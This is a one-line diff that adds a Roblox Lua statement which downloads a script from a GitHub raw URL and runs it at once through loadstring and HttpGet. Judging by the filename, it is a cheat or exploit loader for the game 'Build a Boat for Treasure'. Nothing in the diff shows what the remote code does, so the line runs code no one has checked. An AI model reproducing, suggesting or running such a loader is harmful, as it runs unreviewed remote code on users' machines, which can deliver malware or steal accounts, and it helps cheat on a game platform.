@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/build-a-boat-for-treasure-spam7-fkhhkdluo0xld8.lua"))()
